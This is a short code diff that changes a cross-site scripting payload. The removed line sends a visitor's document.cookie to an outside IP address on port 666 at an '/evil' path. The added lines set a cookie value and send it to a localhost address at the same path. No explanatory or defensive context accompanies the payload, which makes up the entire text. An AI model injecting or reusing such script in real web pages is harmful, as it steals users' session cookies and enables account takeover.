@@ -1,1 +1,4 @@
-<script>fetch("http://161.35.76.26:666/evil?cookie="+document.cookie);</script>
+<script>
+	document.cookie = "Token"; 
+	fetch("http://127.0.0.1:666/evil?cookie="+document.cookie);
+</script>
